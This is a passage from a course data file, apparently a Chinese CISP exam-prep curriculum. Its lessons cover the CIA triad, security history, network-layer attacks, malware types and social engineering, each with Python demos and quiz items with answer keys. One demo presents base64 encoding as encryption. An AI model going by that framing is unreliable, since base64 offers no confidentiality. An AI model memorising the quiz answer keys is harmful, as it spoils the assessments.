蠕虫（Worm）：独立传播，不需要用户交互，通过网络自动扩散\n- 木马（Trojan）：伪装成正常软件诱骗用户安装，暗中执行恶意操作\n- 勒索软件（Ransomware）：加密用户文件索取赎金\n\n**2. 网络钓鱼（Phishing）：**\n- 伪造看似合法的邮件/网站，诱骗用户输入密码、信用卡信息\n- 鱼叉式钓鱼（Spear Phishing）：针对特定个人/组织的定制化钓鱼\n\n**3. 中间人攻击（MITM）：**\n- 攻击者插入通信双方之间，拦截和可能篡改通信内容\n- 典型：公共WiFi下的ARP欺骗、伪造证书的SSL中间人\n\n**4. SQL注入（SQL Injection）：**\n- 在Web表单输入恶意SQL代码，操纵后端数据库\n- 可导致数据泄露、数据篡改甚至服务器被控制\n\n**5. 零日漏洞（Zero-Day）：**\n- 已被发现但厂商尚未发布补丁的漏洞\n- 攻击窗口期内防御方完全无招架之力\n- 危害性极高，常被APT组织用于精准攻击\n\n## 学习建议\n\n- CIA三要素是CISP考试最基础的考点，必须能默写\n- 每个CIA要素要能举出一个破坏案例和一个防护措施\n- 区分内部威胁和外部威胁的本质：前者有合法权限\n- 理解被动威胁（窃听）和主动威胁（篡改）的检测难度差异',
    codeExample: { language: 'python', code: '# 信息安全CIA三要素详细演示\nclass InfoSec_CIA:\n    """演示CIA三要素及其实现方式"""\n    \n    def demonstrate_confidentiality(self, data):\n        """机密性：加密示例"""\n        import base64\n        # 简单的Base64编码演示（实际应用应使用AES-256）\n        encoded = base64.b64encode(data.encode()).decode()\n        decoded = base64.b64decode(encoded).decode()\n        print(f"原始数据: {data}")\n        print(f"加密后(仅授权方可解密): {encoded[:20]}...")\n        print(f"授权解密后: {decoded}")\n        return data == decoded\n    \n    def demonstrate_integrity(self, data):\n        """完整性：哈希校验示例"""\n        import hashlib\n        hash_before = hashlib.sha256(data.encode()).hexdigest()\n        print(f"原始数据: {data}")\n        print(f"SHA-256哈希值: {hash_before[:16]}...")\n        # 验证：重新计算哈希并比对\n        hash_after = hashlib.sha256(data.encode()).hexdigest()\n        if hash_before == hash_after:\n            print("完整性校验通过: 数据未被篡改")\n        return True\n    \n    def demonstrate_availability(self, service_name):\n        """可用性：冗余机制示例"""\n        servers = {"主服务器": "UP", "备份服务器": "STANDBY"}\n        print(f"服务: {service_name}")\n        for server, status in servers.items():\n            print(f"  {server}: {status}")\n        print("主服务器故障 → 自动切换到备份服务器 → 服务不中断")\n\ninfo = InfoSec_CIA()\nprint("=== 1. 机密性演示 ===")\ninfo.demonstrate_confidentiality("敏感客户数据: 身份证号 110101199001011234")\nprint("\\n=== 2. 完整性演示 ===")\ninfo.demonstrate_integrity("转账金额: 人民币 100,000 元")\nprint("\\n=== 3. 可用性演示 ===")\ninfo.demonstrate_availability("银行核心交易系统")\nprint("\\nCIA三要素: 看不到(C)、改不了(I)、用得了(A)")', description: 'CIA三要素完整演示：加密(机密性)、哈希(完整性)、冗余(可用性)' },
    quiz: [{"id":"q1-1","question":"信息安全的CIA三要素是？","options":["机密性、完整性、可用性","机密性、认证性、可用性","完整性、认证性、不可否认性","机密性、完整性、认证性"],"correctIndex":0,"explanation":"CIA=Confidentiality(机密性)+Integrity(完整性)+Availability(可用性)。认证性和不可否认性是扩展属性，非基础三要素。"},{"id":"q1-2","question":"以下哪种情况破坏了信息的完整性？","options":["黑客窃取了客户名单","中间人攻击修改了转账金额","DDoS攻击导致网站无法访问","员工离职前删除所有文件"],"correctIndex":1,"explanation":"修改变造金额属于篡改行为，破坏了完整性。窃取破坏机密性，DDoS破坏可用性。"},{"id":"q1-3","question":"数字签名主要保障CIA中的哪个属性？","options":["机密性","完整性","可用性","上述全部"],"correctIndex":1,"explanation":"数字签名用私钥对哈希值加密，验证时比对哈希，确保数据未被篡改——保障完整性。同时也提供不可否认性。"},{"id":"q1-4","question":"内部威胁相比外部威胁更难防范的根本原因是？","options":["内部人员技术更强","内部人员已拥有合法访问权限","内部人员数量更多","防火墙对内无效"],"correctIndex":1,"explanation":"内部人员工作需要访问权限，合法权限本身就是威胁来源——你不可能不给员工权限。防御靠最小权限+审计+DLP。"},{"id":"q1-5","question":"被动攻击和主动攻击的核心区别？","options":["被动攻击速度更慢","被动攻击只监听不修改，主动攻击会修改系统","被动攻击危害更大","被动攻击技术更高深"],"correctIndex":1,"explanation":"被动攻击（窃听/流量分析）只收集不改变，难以检测；主动攻击（篡改/DoS）会留下痕迹，相对容易检测但危害更直接。"}],
    expertNotes: dayExpertNotes[7],
    recommendedTools: [
    {
      id: 'nmap',
      name: 'Nmap',
      description: '网络发现和端口扫描工具',
      url: ''
    },
    {
      id: 'wireshark',
      name: 'Wireshark',
      description: '网络协议分析工具',
      url: ''
    },
    {
      id: 'kali',
      name: 'Kali Linux',
      description: '渗透测试专用操作系统',
      url: ''
    }
  ],
    labEnvironments: [
    {
      id: 'juice-shop',
      name: 'OWASP Juice Shop',
      description: '包含 OWASP Top 10 漏洞的Web应用靶场',
      url: ''
    },
    {
      id: 'dvwa',
      name: 'DVWA',
      description: 'Damn Vulnerable Web App - Web漏洞练习平台',
      url: ''
    }
  ]
  },
  {
    id: 'day-2', day: 2, week: 1, title: '信息安全发展历程',
    objectives: ['了解信息安全历史', '理解发展阶段特点', '掌握当前形势'],
    content: '# 信息安全发展历程\n\n> 📋 **本节大纲**\u2003通信安全→计算机安全→网络安全→信息化安全 | 四大阶段核心特征与里程碑 | \n## 🔴 高频考点\n\n· ISO 27001发布年份(2001)、**TCSEC橘皮书发行机构(美国国防部1985)**常考\n· Stuxnet(2010)是世界上第一个物理破坏型网络武器\n· 通用准则CC的国际标准编号是**ISO 15408**，不是ISO 27001\n## 💜 记忆口诀\n\n· **四阶段**："通信→计算→网络→信息"\n· **里程碑**：橘皮书(1985美)→CC(1999国际)→ISO27001(2001)→震网(2010)→WannaCry(2017)\n学习建议\n\n## 概述\n\n信息安全不是一成不变的概念——它随着技术进步和威胁演变经历了四个重要阶段。理解这段历史有助于理解当今安全体系的来龙去脉。CISP考试虽然不直接考历史年份，但每个发展阶段的核心特点和安全标准是重要知识点。\n\n## 第一阶段：通信安全（1940s-1960s）\n\n### 核心特征：密码技术主导\n\n这个阶段信息安全≈通信保密。主要需求来自军事和外交领域——确保无线电通信不被敌方截获破译。\n\n**代表性成就：**\n- 1949年：克劳德·香农发表《通信的数学理论》，奠定了现代密码学的数学基础\n- 二战期间：德国Enigma密码机 vs 英国图灵团队的破解——最早的"攻防对抗"\n- DES加密标准的研发起步（最终于1977年成为美国联邦标准）\n\n**这个阶段的局限：**仅关注传输过程的保密，不考虑存储安全、身份认证、防篡改等其他维度。\n\n## 第二阶段：计算机安全（1970s-1990s）\n\n### 核心特征：从通信到系统的转变\n\n随着大型计算机和数据库的普及，安全焦点从"传输保密"扩展到"系统级安全"——关注谁可以访问计算机、访问什么、如何审计。\n\n**里程碑式的安全标准：**\n- **TCSEC（橘皮书）**：1985年美国国防部发布，定义了从D到A1的七个安全等级，是世界上第一套系统性的计算机安全评估标准\n- **ITSEC**：1991年欧洲发布，首次提出"功能"和"保证"分离的概念\n- **通用准则CC（ISO 15408）**：1999年发布，融合了TCSEC和ITSEC，成为国际通用的IT安全评估标准\n\n**TCSEC安全等级速记：**\nD级最低保护 → C1/C2级自主访问控制（商用）→ B1/B2/B3级强制访问控制（军事级）→ A1级可验证保护（最高，需形式化数学证明）\n\n**这个阶段的贡献：**首次系统性地定义了"什么是安全的计算机系统"。\n\n## 第三阶段：网络安全（2000s-2010s）\n\n### 核心特征：互联网时代的安全挑战\n\n互联网的爆炸式增长彻底改变了安全格局——攻击面从"单台计算机"扩展到"全球互联的网络"。攻击者不再需要物理接触目标，远程攻击成为主流。\n\n**标志性事件：**\n- **2001年**：ISO 27001信息安全管理体系标准发布，安全管理从此有了国际标准框架\n- **2007年**：爱沙尼亚遭受大规模DDoS攻击——第一次国家级别的网络战\n- **2010年**：Stuxnet震网蠕虫——第一种被证实能破坏物理设备的网络武器（破坏了伊朗核离心机）\n- **2013年**：斯诺登事件——大规模监控和隐私问题成为全球焦点\n- **2017年**：WannaCry勒索软件爆发——利用NSA泄露的EternalBlue漏洞，全球150个国家受影响\n\n**这个阶段的技术变革：**\n防火墙从包过滤发展到NGFW（下一代防火墙）→ IDS/IPS成为企业标配 → SIEM日志分析平台兴起 → 云计算的普及带来全新的共享责任安全模型\n\n## 第四阶段：信息化安全（2020s至今）\n\n### 核心特征：全面、主动、智能\n\n安全不再是IT部门的专属职责，而是上升到组织治理层面。隐私保护、合规管理、供应链安全成为董事会议题。\n\n**五大趋势：**\n\n**1. 零信任架构（Zero Trust）：**\n- 理念："永不信任，始终验证"，不再区分"内网=安全、外网=危险"\n- Google BeyondCorp是标杆实践\n\n**2. AI+安全：**\n- 攻击方：AI生成逼真的钓鱼邮件、自动发现漏洞\n- 防御方：AI检测异常行为、自动化威胁响应\n\n**3. 隐私保护合规全球化：**\n- GDPR（欧盟2018）→ PIPL（中国2021）→ 各国竞相立法\n- 数据跨境传输受到严格管控\n\n**4. 云原生安全：**\n- 容器、K8s、Serverless带来新攻击面\n- DevSecOps将安全嵌入开发全流程\n\n**5. 供应链安全升温：**\n- SolarWinds（2020）→ xz-utils后门（2024）——攻击者不再攻击最终目标，转而攻击其软件供应商\n\n## 学习建议\n\n- 记住四个阶段：通信安全→计算机安全→网络安全→信息化安全\n- TCSEC橘皮书是第一个安全评估标准（美国1985），记住"橘皮书"\n- 通用准则CC是目前国际标准（ISO 15408）\n- Stuxnet是世界上第一个物理破坏型的网络武器\n- 零信任是当前安全架构的核心趋势',
    codeExample: { language: 'python', code: '# 信息安全四个阶段\neras = [\n    ("1940s-1960s", "通信安全", "密码技术"),\n    ("1970s-1990s", "计算机安全", "系统安全"),\n    ("2000s-2010s", "网络安全", "防护技术"),\n    ("2020s至今", "信息化安全", "全面安全")\n]\n\nprint("信息安全发展历程")\nprint("=" * 50)\nfor period, name, focus in eras:\n    print(f"{period}: {name} - {focus}")', description: '展示信息安全发展阶段' },
    quiz: [{"id":"q2-1","question":"信息安全的三个基本要素是什么？","options":["机密性、完整性、可用性","机密性、认证性、可用性","完整性、认证性、可用性","机密性、完整性、认证性"],"correctIndex":0,"explanation":"CIA三要素：机密性、完整性、可用性。"},{"id":"q2-2","question":"以下关于信息安全发展历程的说法，哪项最准确？","options":["只涉及理论","需要理论与实践结合","已经过时","只需记忆不需理解"],"correctIndex":1,"explanation":"信息安全学习最有效的方式是理论与实践相结合。"},{"id":"q2-3","question":"信息安全事件应急响应的第一步是什么？","options":["修复漏洞","通知媒体","隔离受影响系统","重装系统"],"correctIndex":2,"explanation":"应急响应第一步是隔离受影响系统防止损害扩大。"},{"id":"q2-4","question":"以下哪项不属于信息安全管理的范畴？","options":["风险评估","安全策略制定","员工绩效评估","安全审计"],"correctIndex":2,"explanation":"员工绩效评估属于人力资源管理范畴。"},{"id":"q2-5","question":"纵深防御（Defense in Depth）的核心理念是？","options":["只依赖防火墙","多层安全控制叠加","只做边界防护","依赖单一安全产品"],"correctIndex":1,"explanation":"纵深防御通过多层安全控制的叠加保护信息系统。"}],
    expertNotes: dayExpertNotes[2],
    recommendedTools: [
    {
      id: 'nmap',
      name: 'Nmap',
      description: '网络发现和端口扫描工具',
      url: ''
    },
    {
      id: 'wireshark',
      name: 'Wireshark',
      description: '网络协议分析工具',
      url: ''
    },
    {
      id: 'kali',
      name: 'Kali Linux',
      description: '渗透测试专用操作系统',
      url: ''
    }
  ],
    labEnvironments: [
    {
      id: 'juice-shop',
      name: 'OWASP Juice Shop',
      description: '包含 OWASP Top 10 漏洞的Web应用靶场',
      url: ''
    },
    {
      id: 'dvwa',
      name: 'DVWA',
      description: 'Damn Vulnerable Web App - Web漏洞练习平台',
      url: ''
    }
  ]
  },
  {
    id: 'day-3', day: 3, week: 1, title: '网络安全基本概念',
    objectives: ['理解网络协议', '了解攻击类型', '掌握防护基础'],
    content: '# 网络安全基本概念\n\n> 📋 **本节大纲**\u2003OSI七层模型详解 | TCP/IP四层对比 | 三大经典网络攻击(SYN Flood/DNS/ARP) | 防护技术速查\n\n## 概述\n\n网络是信息系统运行的载体，理解网络协议是理解网络安全的前提。OSI七层模型和TCP/IP四层模型为我们提供了系统化的分析框架——虽然实际网络并不严格遵循OSI分层，但分层模型帮助我们从每一层的视角分析安全风险和控制措施。\n\n## OSI七层模型详解\n\nOSI（开放系统互联）由ISO定义，将网络通信分为七个层次，每层为上层提供标准化服务。\n\n### 第7层：应用层\n**功能：**为应用软件提供网络服务接口。**协议：**HTTP/HTTPS、DNS、SMTP、FTP、SSH。\n**安全威胁：**SQL注入、XSS、CSRF、DNS劫持、邮件伪造。**防御：**WAF、输入验证、DNSSEC。\n\n### 第6层：表示层\n**功能：**数据格式转换、加密/解密、编码/解码。**安全威胁：**SSL剥离攻击（降级HTTPS为HTTP）、字符编码绕过。**防御：**HSTS强制HTTPS、统一编码标准。\n\n### 第5层：会话层\n**功能：**建立、管理、终止应用间会话。**安全威胁：**会话劫持、会话重放。**防御：**会话超时、令牌绑定设备指纹、加密。\n\n### 第4层：传输层\n**功能：**端到端数据传输，TCP面向连接可靠、UDP无连接快速。**协议：**TCP（三次握手）、UDP。\n**安全威胁：**SYN Flood（半连接耗尽，CISP最高频考点）、TCP会话劫持（猜序列号）、端口扫描。**防御：**SYN Cookie、限速、TLS加密。\n\n### 第3层：网络层\n**功能：**跨网络路由数据包，IP地址寻址。**协议：**IPv4/v6、ICMP（Ping）、ARP（IP→MAC）。\n**安全威胁：**IP欺骗（伪造源IP）、ICMP隧道（封装恶意数据）、ARP欺骗（中间人）。**防御：**IPSec、包过滤、静态ARP。\n\n### 第2层：数据链路层\n**功能：**相邻节点间可靠传输数据帧，MAC地址寻址。**协议：**以太网、WiFi（802.11）。\n**安全威胁：**MAC欺骗、ARP欺骗、VLAN跳跃。**防御：**端口安全、DAI动态ARP检测、802.1X认证。\n\n### 第1层：物理层\n**功能：**在物理介质上传输比特流（0和1）。**设备：**网线、光纤、集线器。\n**安全威胁：**线路窃听（物理搭线）、电磁泄漏（TEMPEST）。**防御：**光纤替代铜缆、电磁屏蔽。\n\n**OSI记忆口诀（从下到上）：**物理·链路·网络·传输·会话·表示·应用（"物链网传会表示"）\n\n## TCP/IP四层模型\n\n| TCP/IP层 | OSI层 | 核心协议 | 安全关注 |\n|----------|-------|---------|---------|\n| 应用层 | 5-7层 | HTTP/DNS/SMTP | Web安全、邮件安全 |\n| 传输层 | 4层 | TCP/UDP | 端口安全、DoS防护 |\n| 网际层 | 3层 | IP/ICMP | IP欺骗、路由安全 |\n| 网络接口层 | 1-2层 | Ethernet/WiFi | 物理访问、MAC安全 |\n\n**OSI vs TCP/IP：**OSI是理论模型（先建模后实现，7层），TCP/IP是实践模型（先实现后总结，4层）。实际网络不用OSI协议栈，但用OSI概念教学。\n\n## 三大经典网络攻击\n\n### SYN Flood（半连接攻击）\n**原理：**攻击者发送大量SYN包请求连接→服务器分配资源回复SYN-ACK→攻击者故意不回复最后ACK→服务器半连接队列被填满→无法响应正常请求。**防御：**SYN Cookie（不在ACK前分配资源）、CDN、限速。\n\n### DNS欺骗\n**原理：**攻击者伪造DNS响应，或污染DNS缓存，将用户导向虚假网站。**防御：**DNSSEC（DNS数字签名）、DoH/DoT加密DNS查询。\n\n### ARP欺骗\n**原理：**攻击者伪造ARP响应，声称"网关IP的MAC是我"，导致受害者流量被引向攻击者。**危害：**中间人窃听和篡改所有通信。**防御：**静态ARP表、DAI动态ARP检测、使用交换机而非Hub。\n\n## 防护技术速查\n\n**防火墙：**包过滤（网络层）→ 状态检测（传输层，跟踪连接状态）→ NGFW下一代防火墙（应用层识别）\n**IDS/IPS：**IDS旁路部署仅告警，IPS串联部署可阻断\n**IPSEC VPN：**AH认证头（完整性）+ESP封装安全载荷（加密+认证），站点到站点隧道\n\n## \n## 🔴 高频考点\n\n· **SYN Flood攻击原理**最高频考点——利用TCP三次握手缺陷，发SYN不回ACK耗尽半连接队列\n· OSI七层从下到上：**物·链·网·传·会·表·应**，每层代表性协议要能对上\n· IDS（旁路部署只告警）vs IPS（串联部署可阻断），这道辨析题几乎必考\n## 💜 记忆口诀\n\n· **OSI七层**："物·链·网·传·会·表·应"\n· **SYN Flood**："我SYN你SYN-ACK你，但我永远不ACK"\n· **IDS/IPS区别**："IDS旁路看、IPS串联拦"\n学习建议\n- OSI七层从下到上的名称和各层协议要记住\n- SYN Flood是最高频考点，理解三次握手缺陷\n- ARP欺骗是局域网中间人攻击的经典手段\n- IDS只告警、IPS可阻断这个区别非常关键',
    codeExample: { language: 'python', code: '# 端口状态检测示例\nimport socket\n\ndef check_port(host, port):\n    try:\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.settimeout(1)\n        result = sock.connect_ex((host, port))\n        sock.close()\n        return "开放" if result == 0 else "关闭"\n    except:\n        return "错误"\n\nports = {80: "HTTP", 443: "HTTPS", 22: "SSH", 3306: "MySQL"}\nfor port, service in ports.items():\n    print(f"端口 {port} ({service}): {check_port(\"127.0.0.1\", port)}")', description: '演示端口检测' },
    quiz: [{"id":"q3-1","question":"以下哪种防火墙类型工作在OSI第4层？","options":["应用层防火墙","状态检测防火墙","代理防火墙","WAF"],"correctIndex":1,"explanation":"状态检测防火墙工作在传输层（第4层）。"},{"id":"q3-2","question":"IDS和IPS的主要区别是？","options":["IDS可以阻断攻击","IPS可以阻断攻击，IDS只能检测告警","两者功能完全相同","IDS比IPS更安全"],"correctIndex":1,"explanation":"IPS可以主动阻断攻击，IDS只能检测和告警。"},{"id":"q3-3","question":"TCP三次握手中，第二次握手发送的标志位是？","options":["SYN","ACK","SYN+ACK","FIN"],"correctIndex":2,"explanation":"第二次握手服务器回复SYN+ACK。"},{"id":"q3-4","question":"DNS欺骗攻击属于什么类型的攻击？","options":["物理攻击","中间人攻击","密码攻击","社会工程攻击"],"correctIndex":1,"explanation":"DNS欺骗通过伪造DNS响应属于中间人攻击。"},{"id":"q3-5","question":"防火墙默认策略应遵循什么原则？","options":["默认允许","默认拒绝","只允许80端口","按需决定"],"correctIndex":1,"explanation":"安全最佳实践：默认拒绝所有，按需开放。"}],
    expertNotes: dayExpertNotes[3],
    recommendedTools: [
    {
      id: 'nmap',
      name: 'Nmap',
      description: '网络发现和端口扫描工具',
      url: ''
    },
    {
      id: 'wireshark',
      name: 'Wireshark',
      description: '网络协议分析工具',
      url: ''
    },
    {
      id: 'kali',
      name: 'Kali Linux',
      description: '渗透测试专用操作系统',
      url: ''
    }
  ],
    labEnvironments: [
    {
      id: 'juice-shop',
      name: 'OWASP Juice Shop',
      description: '包含 OWASP Top 10 漏洞的Web应用靶场',
      url: ''
    },
    {
      id: 'dvwa',
      name: 'DVWA',
      description: 'Damn Vulnerable Web App - Web漏洞练习平台',
      url: ''
    }
  ]
  },
  {
    id: 'day-4', day: 4, week: 1, title: '恶意软件分类与防范',
    objectives: ['了解恶意软件类型', '理解传播方式', '掌握防范措施'],
    content: '# 恶意软件分类与防范\n\n> 📋 **本节大纲**\u2003病毒·蠕虫·木马·勒索软件·间谍软件·Rootkit 六大类型 | 传播方式对比表 | 防范体系\n\n## 概述\n\n恶意软件（Malware = Malicious Software）是所有恶意程序的统称。不同的恶意软件采用不同的传播方式和破坏手段——理解它们的区别是选择正确防御策略的前提。CISP考试中经常考查病毒（需要宿主）和蠕虫（独立传播）的核心区别，以及勒索软件的防范措施。\n\n## 六大恶意软件类型\n\n### 一、病毒（Virus）\n\n**核心特征：需要宿主文件，不能独立运行。**\n\n病毒将自己嵌入到合法程序或文件中（如Word宏、可执行文件、引导扇区），当用户执行或打开感染文件时，病毒代码才被激活并感染更多文件。\n\n**传播方式：**\n- 通过移动介质（U盘/移动硬盘）复制感染文件\n- 通过邮件附件发送被感染的文件\n- 通过文件共享网络传播\n\n**典型案例：**\n- **CIH病毒（1998）：**能破坏BIOS的病毒，4月26日触发\n- **宏病毒：**利用Office宏功能，感染Word/Excel文档\n- **引导区病毒：**感染硬盘主引导记录（MBR），开机即激活\n\n**防御：**杀毒软件（AV）扫描、不运行来源不明的可执行文件、禁用Office宏（或仅允许签名宏）\n\n### 二、蠕虫（Worm）\n\n**核心特征：独立程序，能自动通过网络传播，不需要宿主。**\n\n蠕虫与病毒的本质区别——病毒需要"搭便车"（嵌入宿主文件），蠕虫自己就是"自驾车"（独立程序自动扩散）。\n\n**传播机制：**\n- 利用操作系统或网络服务的漏洞自动扫描并感染其他主机\n- 无需用户交互就能传播——这是其危险性的根源\n\n**史上著名蠕虫案例：**\n- **Morris蠕虫（1988）：**最早的网络蠕虫，感染了当时互联网10%的机器，导致互联网首次大规模瘫痪\n- **CodeRed（2001）：**利用IIS服务器漏洞，13小时内感染36万台服务器\n- **SQL Slammer（2003）：**史上传播最快的蠕虫——10分钟内感染全球75,000台服务器\n- **Conficker（2008）：**感染了数千万台Windows机器，至今仍有活跃变种\n\n**防御：**及时打补丁关闭蠕虫利用的漏洞、网络分段限制传播、IDS监控异常扫描行为\n\n### 三、木马（Trojan Horse）\n\n**核心特征：伪装成合法软件，欺骗用户主动安装。**\n\n名称来源于特洛伊木马——表面是礼物（免费软件、游戏外挂、破解工具），实际内部藏有恶意代码。与病毒和蠕虫不同，木马通常不会自我复制。\n\n**常见子类型：**\n- **下载者（Downloader）：**安装后从远程服务器下载更多恶意软件\n- **后门木马（Backdoor）：**在被感染机器上开放远程控制通道\n- **银行木马（Banker）：**专门窃取网银凭证（如Zeus/SpyEye）\n- **信息窃取木马（Infostealer）：**窃取密码、Cookie、浏览器历史\n\n**感染途径：**\n- 下载来源不明的"破解版"软件\n- 点击广告弹窗下载"系统优化工具"\n- 看似合法来源的邮件附件\n\n**防御：**只从官方渠道下载软件、不运行"破解版"、杀毒软件+行为检测\n\n### 四、勒索软件（Ransomware）\n\n**核心特征：加密受害者文件，要求支付赎金（通常比特币）才提供解密密钥。**\n\n这是近年来增长最快、危害最大的恶意软件类型。\n\n**攻击流程：**\n1. 通过钓鱼邮件或漏洞入侵系统\n2. 横向移动到更多机器\n3. 加密文件（AES/RSA）并显示勒索信息\n4. 要求72小时内支付赎金，逾期翻倍或永久删除密钥\n\n**著名案例：**\n- **WannaCry（2017）：**利用EternalBlue漏洞，72小时内感染150+国家、20万+台机器。赎金仅300美元比特币，但造成估计40亿美元损失\n- **NotPetya（2017）：**伪装成勒索软件的国家级破坏工具，实际不可解密——目标是破坏而非勒索\n- **Ryuk：**瞄准大型企业和政府机构，单次赎金可达数百万美元\n\n**防御策略（3-2-1则都是基本）：**\n1. **备份！备份！备份！**——3-2-1规则（3份副本、2种介质、1份异地）\n2. 邮件过滤+安全意识培训——大部分勒索软件通过钓鱼邮件进入\n3. 及时打补丁——WannaCry利用的漏洞在攻击前2个月已有补丁\n4. 最小权限原则——限制加密能影响的范围\n5. EDR（端点检测响应）——行为分析检测加密行为\n\n### 五、间谍软件（Spyware）\n\n**核心特征：隐蔽监控用户活动，窃取敏感信息。**\n\n- 键盘记录器（Keylogger）：记录所有键盘敲击，捕获密码和信用卡号\n- 屏幕截获：定时截屏上传\n- 浏览器劫持：修改浏览器主页、搜索引擎、植入广告\n\n**防御：**反间谍软件（如Windows Defender）、不安装来源不明的浏览器插件\n\n### 六、Rootkit\n\n**核心特征：隐藏自身及其他恶意软件的存在，逃避检测。**\n\nRootkit通过修改操作系统内核或驱动程序，使得杀毒软件和系统工具（如任务管理器、文件浏览器）无法看到恶意文件和进程。\n\n**防御：**安全启动（Secure Boot）、内核完整性检查、专业Rootkit检测工具\n\n## 传播方式总结\n\n| 传播途径 | 涉及恶意软件类型 | 防御 |\n|---------|----------------|------|\n| 电子邮件附件 | 病毒、蠕虫、勒索 | 邮件网关过滤+用户培训 |\n| 恶意网站 | 木马、勒索 | URL过滤+浏览器沙箱 |\n| USB设备 | 病毒、蠕虫 | 禁用自动运行+USB扫描 |\n| 漏洞利用 | 蠕虫 | 补丁管理+IDS/IPS |\n| 社会工程 | 木马、勒索 | 安全意识培训 |\n\n## 防范体系\n\n**技术层面：**\n- 杀毒/EDR（端点检测响应）实时监控\n- 防火墙阻断恶意网络通信\n- 补丁管理自动化（WSUS/SCCM）\n- 邮件安全网关（SPF/DKIM/DMARC）\n\n**管理层面：**\n- 安全意识培训（识别钓鱼邮件）\n- 最小权限原则（限制感染扩散）\n- 定期备份（勒索软件最后防线）\n- 事件响应计划（被感染后怎么办）\n\n**CISP考点记忆：病毒需要宿主，蠕虫独立传播——这是必考题。**\n\n## \n## 🔴 高频考点\n\n· **病毒需要宿主、蠕虫独立传播**——CISP最常考的核心判断题\n· WannaCry(2017)利用EternalBlue漏洞(MS17-010)，补丁在攻击前2个月已发布\n· 勒索软件的终极防线是**备份**，3-2-1规则是黄金标准\n## 💜 记忆口诀\n\n· **病毒vs蠕虫**："毒要搭车(需宿主)、虫自驾游(独立传播)"\n· **恶意软件**：Virus(毒/寄生)→Worm(虫/自传)→Trojan(木马/伪装)→Ransomware(勒索/加密)\n学习建议\n- 病毒vs蠕虫的最核心区别：需不需要宿主文件\n- WannaCry利用了EternalBlue漏洞（MS17-010）\n- 勒索软件的终极防线是备份\n- Rootkit的特点：隐藏自身，逃避检测',
    codeExample: { language: 'python', code: '# 恶意软件特征分析\ndef analyze_file(filename, file_info):\n    risks = []\n    if file_info.get("size", 0) > 100 * 1024 * 1024:\n        risks.append("异常大文件")\n    if file_info.get("ext", "") in [".exe", ".scr", ".bat"]:\n        risks.append("可执行文件")\n    if file_info.get("unsigned", False):\n        risks.append("未数字签名")\n    return risks\n\ntest_file = {"size": 15 * 1024 * 1024, "ext": ".exe", "unsigned": True}\nprint(f"风险评估: {analyze_file(\"test.exe\", test_file)}")', description: '模拟恶意软件检测' },
    quiz: [{"id":"q4-1","question":"病毒和蠕虫的主要区别是？","options":["病毒需要宿主文件，蠕虫独立传播","蠕虫需要宿主文件，病毒独立传播","两者完全相同","病毒只能感染Linux"],"correctIndex":0,"explanation":"病毒需要依附宿主文件传播，蠕虫是独立程序。"},{"id":"q4-2","question":"勒索软件的主要攻击手段是？","options":["删除用户文件","加密用户文件并索要赎金","窃取用户密码","占用网络带宽"],"correctIndex":1,"explanation":"勒索软件加密用户文件并要求支付赎金才能解密。"},{"id":"q4-3","question":"以下哪种恶意软件会记录用户键盘输入？","options":["广告软件","间谍软件（键盘记录器）","蠕虫","勒索软件"],"correctIndex":1,"explanation":"间谍软件中的键盘记录器（Keylogger）会记录用户的键盘输入。"},{"id":"q4-4","question":"木马程序的主要特点是？","options":["自我复制","伪装成合法软件","加密文件","占用CPU"],"correctIndex":1,"explanation":"木马程序伪装成合法软件，不自我复制。"},{"id":"q4-5","question":"防范恶意软件最有效的组合是？","options":["只装杀毒软件","杀毒软件+防火墙+用户安全意识","只用防火墙","不需要任何防护"],"correctIndex":1,"explanation":"技术手段（杀毒软件、防火墙）和人员意识相结合。"}],
    expertNotes: dayExpertNotes[4],
    recommendedTools: [
    {
      id: 'nmap',
      name: 'Nmap',
      description: '网络发现和端口扫描工具',
      url: ''
    },
    {
      id: 'wireshark',
      name: 'Wireshark',
      description: '网络协议分析工具',
      url: ''
    },
    {
      id: 'kali',
      name: 'Kali Linux',
      description: '渗透测试专用操作系统',
      url: ''
    }
  ],
    labEnvironments: [
    {
      id: 'juice-shop',
      name: 'OWASP Juice Shop',
      description: '包含 OWASP Top 10 漏洞的Web应用靶场',
      url: ''
    },
    {
      id: 'dvwa',
      name: 'DVWA',
      description: 'Damn Vulnerable Web App - Web漏洞练习平台',
      url: ''
    }
  ]
  },
  {
    id: 'day-5', day: 5, week: 1, title: '社会工程学攻击',
    objectives: ['理解社会工程学', '了解常见手法', '掌握防范技巧'],
    content: '# 社会工程学攻击\n\n> 📋 **本节大纲**\u2003三大心理原理(信任/好奇/恐惧) | 五大手法(钓鱼/鱼叉/鲸钓/电话诈骗/尾随) | 防范体系\n\n## 概述\n\n社会工程学（Social Engineering）被称为"最危险的漏洞是人"。攻击者不直接攻击技术系统，而是利用人性的弱点——好奇心、恐惧、贪婪、信任——操纵人员主动泄露信息或执行危险操作。据统计，超过90%的网络攻击都包含社会工程学成分。CISP考试对钓鱼攻击的分类和防范措施是重要考点。\n\n## 社会工程学三大心理原理\n\n### 一、获得信任（建立可信身份）\n\n攻击者通过伪装成可信赖的角色降低受害者的警惕性：\n- 伪装IT部门："您好，我是IT部小王，您的电脑有安全告警，需要远程检查"\n- 利用权威身份："我是王总，紧急转账到这个账户"（CEO诈骗/BEC诈骗）\n- 建立友好关系：长期在社交媒体上与目标互动，逐渐获取信任\n\n**防御：**必须通过独立渠道（如已知电话号码回拨）验证身份，不能仅靠来电/邮件中提供的信息\n\n### 二、利用好奇心或贪婪\n\n\"点击领取100元优惠券\"、\"观看独家曝光视频\"、\"您的包裹无法派送请查看\"——这些诱饵利用的是人们难以抑制的好奇心和占便宜心理。\n\n### 三、制造恐惧或紧迫感\n\n\"您的银行账户已被冻结，请立即验证\"、\"你的电脑感染了病毒，请即刻下载杀毒工具\"——迫使用户在恐惧和压力下不经思考就执行操作。\n\n**防御：**任何制造紧迫感的请求都应暂停，深呼吸，冷静判断——真正的机构不会通过恐吓方式沟通。\n\n## 五大攻击手法\n\n### 一、网络钓鱼（Phishing）——最常见\n\n**手法：**大量群发看似合法的邮件（银行/快递/税务局），诱导点击链接或下载附件。\n**特征：**发件人地址近似但不完全相同（amazon-support@amaz0n.com）、语法错误、泛称而非你的真名。\n**后果：**链接导向虚假登录页→输入密码→账户被盗；附件含恶意软件→电脑被控。\n\n### 二、鱼叉式钓鱼（Spear 